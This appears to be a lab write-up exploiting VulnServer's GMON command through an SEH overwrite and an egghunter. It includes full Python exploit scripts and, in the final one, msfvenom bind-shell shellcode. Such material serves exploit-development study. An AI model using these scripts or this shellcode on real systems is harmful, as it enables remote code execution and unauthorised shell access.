---
layout: post
title:  "[VulnServer] Exploiting GMON Command via SEH and Egghunter"
date:   2018-06-30
categories: [exploitdev, osceprep]
---

I used the following skeleton to exploit the `GMON` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

Executing this code caused a crash to the application. As observed, **EIP** was not overwritten with A’s. So, what caused the crash?
![Crash](/static/img/2018-06-30-vulnserver-gmon/01.png)

By observing the **SEH chain**, it was seen that the SEH record were overwritten with A’s. So, this what caused the crash to the application.
![SEH Chain](/static/img/2018-06-30-vulnserver-gmon/02.png)

To determine the offset that overwrote the **SEH chain**, I `!mona pc 5000` to generate a unique string of 5000 bytes, and then modified the code.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

Using `!mona findmsp`, it was discovered that the **nSEH** record was overwritten with an offset of **3495 bytes**.
![Offset](/static/img/2018-06-30-vulnserver-gmon/03.png)

I then modified the exploit to the following.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "BBBB"
seh = "CCCC"

buffer = "A"*3495
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen, the offset was correct. **nSEH** was overwritten with 4 B’s, while 4 C’s overwrote **SEH**.
![Overwrite](/static/img/2018-06-30-vulnserver-gmon/04.png)

As seen in this image, the buffer of D’s was located right after the B’s and C’s. This was a good place to store all the candidates for bad characters.
![Buffer of D's](/static/img/2018-06-30-vulnserver-gmon/05.png)

I executed the modified code to identify the bad characters. _(Note: The **NULL** (`\x00`) character was already removed.)_
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "BBBB"
seh = "CCCC"

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*3495
buffer += nseh
buffer += seh
buffer += badchars
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen, no other bad characters were identified except the NULL byte.
![Badchars](/static/img/2018-06-30-vulnserver-gmon/06.png)

To identify an address containing the `POP POP RET` instructions, I used `!mona seh`. I used the first instruction from the result, which was `0x625010B4`. 
![PopPopRet](/static/img/2018-06-30-vulnserver-gmon/07.png)

The following shows the updated code.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "BBBB"
seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll

buffer = "A"*3495
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

The updated code worked and **SEH** was overwritten with the address of the `POP POP RET` instructions.
![PopPopRet Worked](/static/img/2018-06-30-vulnserver-gmon/08.png)

By passing the exception, by pressing **SHIFT + F9**, I was redirected to the address of the `POP POP RET` instructions.
![Pass Exec](/static/img/2018-06-30-vulnserver-gmon/09.png)

Stepping into the `POP POP RET` instructions redirected me to the **nSEH** record, which contained the 4 bytes of B’s. 
![nSEH](/static/img/2018-06-30-vulnserver-gmon/10.png)

The next step would be to change this 4 B’s with a jump instruction that would redirect me to my shellcode. However, as seen above, I couldn’t use the buffer of D’s as it’s only 28 bytes long. Even for an egghunter, that wouldn’t be enough since it requires 32 bytes of space. Since the buffer of A’s was located right above the buffer of 4 B’s, I had to jump back. For this, I couldn’t make a "long jump" as the equivalent opcodes was 5 bytes long. That wouldn’t fit inside **nSEH** with only 4 bytes of space. Instead, I jumped back 50 bytes just like in my [previous post](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/29/vulnserver-kstet.html). The following shows the code that I used.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll

buffer = "A"*3495
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

As seen here, the negative jump worked. Next step would be to place the egghunter code in this location.
![Negative Jump](/static/img/2018-06-30-vulnserver-gmon/11.png)

I used `!mona egg -t CAPT` to generate the egghunter.
![Egghunter](/static/img/2018-06-30-vulnserver-gmon/12.png)

Before using the egghunter, I had to determine first the offset (the number of A’s) before the egghunter code. To do that, I made a simple computation: **original 3495 bytes of A’s + 2 bytes for the backward jump opcodes - 50 bytes for the length of backward jump = 3447 bytes of A’s**. The following shows the updated code.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll

# Egg: CAPT
# Size: 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = "A"*3447
buffer += egghunter
buffer += "A"*(3495-len(buffer))
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

The redirection and calculation worked, and the current instruction pointed to the start of the egghunter.
![Start of Egghunter](/static/img/2018-06-30-vulnserver-gmon/13.png)

Then I generated a shellcode using the MSFvenom.
![Shell](/static/img/2018-06-30-vulnserver-gmon/14.png)

Since the remaining buffer of A’s was still large, I decided to place the egg/tag and the shellcode right after the `GMON` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

nseh = "\xEB\xCE\x90\x90"   # Jump back 50 bytes for egghunter
seh = "\xB4\x10\x50\x62"    # POP POP RET from essfunc.dll

# Egg: CAPT
# Size: 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x41\x50\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xdb\xc8\xd9\x74\x24\xf4\xb8\x4f\x0d\xf8\xd8\x5d\x29\xc9\xb1"
"\x53\x31\x45\x17\x83\xc5\x04\x03\x0a\x1e\x1a\x2d\x68\xc8\x58"
"\xce\x90\x09\x3d\x46\x75\x38\x7d\x3c\xfe\x6b\x4d\x36\x52\x80"
"\x26\x1a\x46\x13\x4a\xb3\x69\x94\xe1\xe5\x44\x25\x59\xd5\xc7"
"\xa5\xa0\x0a\x27\x97\x6a\x5f\x26\xd0\x97\x92\x7a\x89\xdc\x01"
"\x6a\xbe\xa9\x99\x01\x8c\x3c\x9a\xf6\x45\x3e\x8b\xa9\xde\x19"
"\x0b\x48\x32\x12\x02\x52\x57\x1f\xdc\xe9\xa3\xeb\xdf\x3b\xfa"
"\x14\x73\x02\x32\xe7\x8d\x43\xf5\x18\xf8\xbd\x05\xa4\xfb\x7a"
"\x77\x72\x89\x98\xdf\xf1\x29\x44\xe1\xd6\xac\x0f\xed\x93\xbb"
"\x57\xf2\x22\x6f\xec\x0e\xae\x8e\x22\x87\xf4\xb4\xe6\xc3\xaf"
"\xd5\xbf\xa9\x1e\xe9\xdf\x11\xfe\x4f\x94\xbc\xeb\xfd\xf7\xa8"
"\xd8\xcf\x07\x29\x77\x47\x74\x1b\xd8\xf3\x12\x17\x91\xdd\xe5"
"\x58\x88\x9a\x79\xa7\x33\xdb\x50\x6c\x67\x8b\xca\x45\x08\x40"
"\x0a\x69\xdd\xfd\x02\xcc\x8e\xe3\xef\xae\x7e\xa4\x5f\x47\x95"
"\x2b\x80\x77\x96\xe1\xa9\x10\x6b\x0a\xc4\xbc\xe2\xec\x8c\x2c"
"\xa3\xa7\x38\x8f\x90\x7f\xdf\xf0\xf2\xd7\x77\xb8\x14\xef\x78"
"\x39\x33\x47\xee\xb2\x50\x53\x0f\xc5\x7c\xf3\x58\x52\x0a\x92"
"\x2b\xc2\x0b\xbf\xdb\x67\x99\x24\x1b\xe1\x82\xf2\x4c\xa6\x75"
"\x0b\x18\x5a\x2f\xa5\x3e\xa7\xa9\x8e\xfa\x7c\x0a\x10\x03\xf0"
"\x36\x36\x13\xcc\xb7\x72\x47\x80\xe1\x2c\x31\x66\x58\x9f\xeb"
"\x30\x37\x49\x7b\xc4\x7b\x4a\xfd\xc9\x51\x3c\xe1\x78\x0c\x79"
"\x1e\xb4\xd8\x8d\x67\xa8\x78\x71\xb2\x68\x98\x90\x16\x85\x31"
"\x0d\xf3\x24\x5c\xae\x2e\x6a\x59\x2d\xda\x13\x9e\x2d\xaf\x16"
"\xda\xe9\x5c\x6b\x73\x9c\x62\xd8\x74\xb5")

buffer = "CAPTCAPT"
buffer += shellcode
buffer += "A"*(3447-len(buffer))
buffer += egghunter
buffer += "A"*(3495-len(buffer))
buffer += nseh
buffer += seh
buffer += "D"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

The following shows the execution flow.
![Flow](/static/img/2018-06-30-vulnserver-gmon/15.png)

Upon executing the final exploit code, the egghunter successfully located the egg/tag and my shellcode after the `GMON` command.
![Egg](/static/img/2018-06-30-vulnserver-gmon/16.png)

The shellcode worked and the target machine spawned a “listening” port on **4444/tcp**.
![Success](/static/img/2018-06-30-vulnserver-gmon/17.png)

The last thing to do was to connect to the newly opened port to have a shell access.
![Shell](/static/img/2018-06-30-vulnserver-gmon/18.png)
